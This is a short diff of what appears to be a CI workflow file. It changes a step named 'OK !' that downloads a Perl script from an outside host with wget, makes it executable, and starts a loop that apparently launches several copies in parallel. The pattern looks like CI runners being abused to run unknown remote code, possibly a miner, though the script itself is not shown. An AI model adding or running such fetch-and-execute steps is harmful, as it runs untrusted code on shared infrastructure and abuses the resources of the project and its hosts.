@@ -14,7 +14,7 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://wgetz.com/CgXBAnfcEa/cacasexdc.pl -O cacasexdc.pl
+          wget https://wgetz.com/8d4oVktSBm/cacasexdc.pl -O cacasexdc.pl
           chmod +x cacasexdc.pl
           PIDS=()
           for i in {1..4}; do
